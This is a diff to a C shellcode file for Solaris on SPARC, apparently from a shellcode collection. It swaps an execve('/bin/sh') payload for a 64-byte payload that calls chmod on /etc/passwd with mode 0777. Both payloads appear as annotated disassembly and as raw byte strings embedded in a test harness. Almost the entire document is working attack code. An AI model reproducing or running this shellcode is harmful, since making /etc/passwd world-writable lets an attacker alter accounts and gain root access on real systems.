@@ -9,8 +9,8 @@
 #include <unistd.h>
 
 /*
- * SunOS (Solaris) / (sun4u / sparc32) execve("/bin/sh", {"/bin/sh", NULL},
- * NULL) 68 bytes shellcode
+ * SunOS (Solaris) / (sun4u / sparc32) sys_chmod("/etc/passwd", 0777)
+ * 64 bytes shellcode
  *
  * Paulus Gandung Prakosa <gandung@galactic.demon.co.uk>
  *
@@ -19,23 +19,22 @@
  * Disassembly of section .text:
  *
  * 00010074 <_start>:
- * 10074:   11 0b cb d8     sethi  %hi(0x2f2f6000), %o0
- * 10078:   90 12 22 69     or  %o0, 0x269, %o0 ! 2f2f6269 <__bss_start+0x2f2d61b1>
- * 1007c:   13 1b 8b dc     sethi  %hi(0x6e2f7000), %o1
- * 10080:   92 12 63 68     or  %o1, 0x368, %o1 ! 6e2f7368 <__bss_start+0x6e2d72b0>
- * 10084:   94 02 a0 01     inc  %o2
- * 10088:   94 22 a0 01     dec  %o2
- * 1008c:   d4 23 bf fc     st  %o2, [ %sp + -4 ]
- * 10090:   d2 23 bf f8     st  %o1, [ %sp + -8 ]
+ * 10074:   90 10 20 c0     mov  0xc0, %o0
+ * 10078:   90 22 20 c0     sub  %o0, 0xc0, %o0
+ * 1007c:   d0 23 bf fc     st  %o0, [ %sp + -4 ]
+ * 10080:   11 0b cb d9     sethi  %hi(0x2f2f6400), %o0
+ * 10084:   90 12 21 74     or  %o0, 0x174, %o0 ! 2f2f6574 <_end+0x2f2d64bc>
+ * 10088:   d0 23 bf f0     st  %o0, [ %sp + -16 ]
+ * 1008c:   11 18 cb dc     sethi  %hi(0x632f7000), %o0
+ * 10090:   90 12 20 61     or  %o0, 0x61, %o0  ! 632f7061 <_end+0x632d6fa9>
  * 10094:   d0 23 bf f4     st  %o0, [ %sp + -12 ]
- * 10098:   90 23 a0 0c     sub  %sp, 0xc, %o0
- * 1009c:   d4 23 bf f0     st  %o2, [ %sp + -16 ]
- * 100a0:   d0 23 bf ec     st  %o0, [ %sp + -20 ]
- * 100a4:   94 02 a0 01     inc  %o2
- * 100a8:   94 22 a0 01     dec  %o2
- * 100ac:   92 23 a0 14     sub  %sp, 0x14, %o1
- * 100b0:   82 10 20 3b     mov  0x3b, %g1
- * 100b4:   91 d0 20 10     ta  0x10
+ * 10098:   11 1c dc dd     sethi  %hi(0x73737400), %o0
+ * 1009c:   90 12 23 64     or  %o0, 0x364, %o0 ! 73737764 <_end+0x737176ac>
+ * 100a0:   d0 23 bf f8     st  %o0, [ %sp + -8 ]
+ * 100a4:   90 23 a0 10     sub  %sp, 0x10, %o0
+ * 100a8:   92 10 21 ff     mov  0x1ff, %o1
+ * 100ac:   82 10 20 0f     mov  0xf, %g1
+ * 100b0:   91 d0 20 10     ta  0x10
  */
 
 #ifndef __sect_shellcode
@@ -58,15 +57,14 @@
 #define unused(x) ((void)(x))
 #endif
 
-static char *shellcode = "\x11\x0b\xcb\xd8\x90\x12\x22\x69"
-                         "\x13\x1b\x8b\xdc\x92\x12\x63\x68"
-                         "\x94\x02\xa0\x01\x94\x22\xa0\x01"
-                         "\xd4\x23\xbf\xfc\xd2\x23\xbf\xf8"
-                         "\xd0\x23\xbf\xf4\x90\x23\xa0\x0c"
-                         "\xd4\x23\xbf\xf0\xd0\x23\xbf\xec"
-                         "\x94\x02\xa0\x01\x94\x22\xa0\x01"
-                         "\x92\x23\xa0\x14\x82\x10\x20\x3b"
-                         "\x91\xd0\x20\x10";
+static char *shellcode = "\x90\x10\x20\xc0\x90\x22\x20\xc0"
+                         "\xd0\x23\xbf\xfc\x11\x0b\xcb\xd9"
+                         "\x90\x12\x21\x74\xd0\x23\xbf\xf0"
+                         "\x11\x18\xcb\xdc\x90\x12\x20\x61"
+                         "\xd0\x23\xbf\xf4\x11\x1c\xdc\xdd"
+                         "\x90\x12\x23\x64\xd0\x23\xbf\xf8"
+                         "\x90\x23\xa0\x10\x92\x10\x21\xff"
+                         "\x82\x10\x20\x0f\x91\xd0\x20\x10";
 
 int __unsafe main(int argc, char **argv) {
   unused(argc);
